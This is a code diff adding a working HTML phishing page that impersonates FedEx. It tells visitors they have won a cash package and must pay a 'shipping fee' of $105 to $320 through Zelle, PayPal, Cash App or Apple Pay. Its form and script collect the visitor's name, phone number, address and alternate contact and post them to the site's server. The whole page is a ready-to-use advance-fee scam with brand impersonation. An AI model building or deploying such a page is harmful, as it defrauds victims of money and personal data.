@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FedEx Shipping Department</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background-color: #f8f8f8;
+    margin: 0;
+    padding: 0;
+    color: #000;
+    font-weight: bold;
+  }
+
+  .fedex-logo {
+    position: absolute;
+    top: 15px;
+    left: 25px;
+    font-size: 28px;
+    font-weight: bold;
+  }
+
+  .fedex-logo span:first-child { color: #4D148C; }
+  .fedex-logo span:last-child { color: #FF6600; }
+
+  .tm {
+    font-size: 12px;
+    vertical-align: super;
+    color: #000;
+  }
+
+  .container {
+    max-width: 500px;
+    background: #fff;
+    margin: 80px auto;
+    padding: 20px 25px;
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    position: relative;
+  }
+
+  .header-img {
+    width: 100%;
+    border-radius: 10px;
+    margin-top: 15px;
+  }
+
+  h2 {
+    text-align: center;
+    margin-top: 15px;
+    color: #000;
+  }
+
+  .info {
+    margin-top: 15px;
+    line-height: 1.5;
+  }
+
+  .info b { text-decoration: underline; }
+
+  .options { margin-top: 25px; }
+
+  .option {
+    background: #fff;
+    border: 1px solid #ccc;
+    padding: 12px 15px;
+    border-radius: 6px;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    transition: border-color 0.2s, background 0.2s;
+  }
+
+  .option input { margin-right: 10px; }
+
+  .option.selected {
+    border-color: #4D148C;
+    background: #f6f2ff;
+  }
+
+  #payment-section {
+    display: none;
+    margin-top: 30px;
+  }
+
+  .payment-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+  }
+
+  .pay-card {
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    text-align: center;
+    padding: 15px;
+    transition: 0.2s;
+    cursor: pointer;
+  }
+
+  .pay-card:hover, .pay-card.selected {
+    border-color: #4D148C;
+    background: #f6f2ff;
+    transform: scale(1.03);
+  }
+
+  .pay-card img {
+    width: 55px;
+    height: 55px;
+    object-fit: contain;
+    margin-bottom: 8px;
+  }
+
+  label, input[type="tel"], input[type="text"], textarea, p {
+    display: block;
+    width: 100%;
+    margin-top: 15px;
+  }
+
+  input[type="tel"], input[type="text"], textarea {
+    padding: 10px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    outline: none;
+    color: #000;
+    font-weight: bold;
+  }
+
+  input[type="tel"]:focus, input[type="text"]:focus, textarea:focus {
+    border-color: #4D148C;
+  }
+
+  textarea {
+    resize: vertical;
+    min-height: 70px;
+  }
+
+  .submit-btn {
+    display: none;
+    margin-top: 25px;
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: bold;
+    color: #fff;
+    background-color: #4D148C;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out;
+  }
+
+  .submit-btn.show {
+    display: block;
+    opacity: 1;
+  }
+
+  @media (max-width: 500px) {
+    .container { margin: 20px; }
+    .fedex-logo { left: 15px; font-size: 24px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="fedex-logo">
+  <span>Fed</span><span>Ex</span><span class="tm">™</span>
+</div>
+
+<div class="container">
+  <img class="header-img" src="assets/fedex_hand_at_the_top.jpg" alt="FedEx delivery photo">
+
+  <h2>FedEx Shipping Department</h2>
+
+  <div class="info">
+    <p><b>CONGRATULATIONS!</b> Your winning info has been approved by FedEx delivery department. Kindly note that you’re to pay for the shipment in order to get a tracking number.</p>
+    <p><b>NOTE:</b> Your cash package has been scheduled for delivery to the provided address. Please select the delivery service you want and how much you are able to pay for shipping.</p>
+  </div>
+
+  <div class="options">
+    <p><b>Shipping costs *</b></p>
+    <div class="option"><input type="radio" name="shipping" value="1 day - $320"> 1 day - $320</div>
+    <div class="option"><input type="radio" name="shipping" value="2 days - $202"> 2 days - $202</div>
+    <div class="option"><input type="radio" name="shipping" value="3 days - $175"> 3 days - $175</div>
+    <div class="option"><input type="radio" name="shipping" value="4 days - $150"> 4 days - $150</div>
+    <div class="option"><input type="radio" name="shipping" value="5 days - $125"> 5 days - $125</div>
+    <div class="option"><input type="radio" name="shipping" value="6 days - $115"> 6 days - $115</div>
+    <div class="option"><input type="radio" name="shipping" value="7 days - $105"> 7 days - $105</div>
+  </div>
+
+  <div id="payment-section">
+    <p><b>Payment Method *</b></p>
+    <div class="payment-grid">
+      <div class="pay-card" data-method="Zelle">
+        <img src="assets/zelle.jpg" alt="Zelle">
+        <p>Zelle®</p>
+      </div>
+      <div class="pay-card" data-method="PayPal">
+        <img src="assets/paypal.jpg" alt="PayPal">
+        <p>PayPal</p>
+      </div>
+      <div class="pay-card" data-method="CashApp">
+        <img src="assets/cashapp.jpg" alt="Cash App">
+        <p>Cash App</p>
+      </div>
+      <div class="pay-card" data-method="ApplePay">
+        <img src="assets/applepay.jpg" alt="Apple Pay">
+        <p>Apple Pay</p>
+      </div>
+    </div>
+
+    <label for="name">Full Name *</label>
+    <input type="text" id="name" placeholder="Enter your full name">
+
+    <label for="phone">Phone Number *</label>
+    <input type="tel" id="phone" placeholder="Enter your phone number">
+
+    <label for="address">Delivery Address (with city/state/ZIP) *</label>
+    <textarea id="address" placeholder="Enter your full delivery address including city, state, and ZIP code"></textarea>
+
+    <label for="altContact">Alternate Contact (optional)</label>
+    <input type="tel" id="altContact" placeholder="Enter an alternate contact number (optional)">
+
+    <button class="submit-btn" id="submitBtn">Submit</button>
+  </div>
+</div>
+
+<script>
+  const options = document.querySelectorAll('.option');
+  const paymentSection = document.getElementById('payment-section');
+  const payCards = document.querySelectorAll('.pay-card');
+  const submitBtn = document.getElementById('submitBtn');
+  const inputs = {
+    name: document.getElementById('name'),
+    phone: document.getElementById('phone'),
+    address: document.getElementById('address'),
+    altContact: document.getElementById('altContact')
+  };
+
+  let selectedShipping = null;
+  let selectedPayment = null;
+
+  options.forEach(opt => {
+    opt.addEventListener('click', () => {
+      options.forEach(o => o.classList.remove('selected'));
+      opt.classList.add('selected');
+      opt.querySelector('input').checked = true;
+      selectedShipping = opt.querySelector('input').value;
+      paymentSection.style.display = 'block';
+      paymentSection.scrollIntoView({ behavior: 'smooth' });
+      checkFormCompletion();
+    });
+  });
+
+  payCards.forEach(card => {
+    card.addEventListener('click', () => {
+      payCards.forEach(c => c.classList.remove('selected'));
+      card.classList.add('selected');
+      selectedPayment = card.dataset.method;
+      checkFormCompletion();
+    });
+  });
+
+  Object.values(inputs).forEach(input => {
+    input.addEventListener('input', checkFormCompletion);
+  });
+
+  function checkFormCompletion() {
+    const allFilled =
+      inputs.name.value.trim() &&
+      inputs.phone.value.trim() &&
+      inputs.address.value.trim() &&
+      selectedShipping &&
+      selectedPayment;
+
+    if (allFilled) {
+      submitBtn.classList.add('show');
+    } else {
+      submitBtn.classList.remove('show');
+    }
+  }
+
+  submitBtn.addEventListener('click', async () => {
+    const data = {
+      name: inputs.name.value.trim(),
+      phone: inputs.phone.value.trim(),
+      address: inputs.address.value.trim(),
+      altContact: inputs.altContact.value.trim(),
+      shipping: selectedShipping,
+      payment: selectedPayment,
+      timestamp: new Date().toLocaleString()
+    };
+
+    try {
+      const res = await fetch("/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      if (res.ok) {
+        window.location.href = "landing_page.html";
+      } else {
+        alert("❌ Something went wrong submitting your form.");
+      }
+    } catch (err) {
+      alert("⚠️ Failed to send data to server.");
+      console.error(err);
+    }
+  });
+</script>
+
+</body>
+</html>
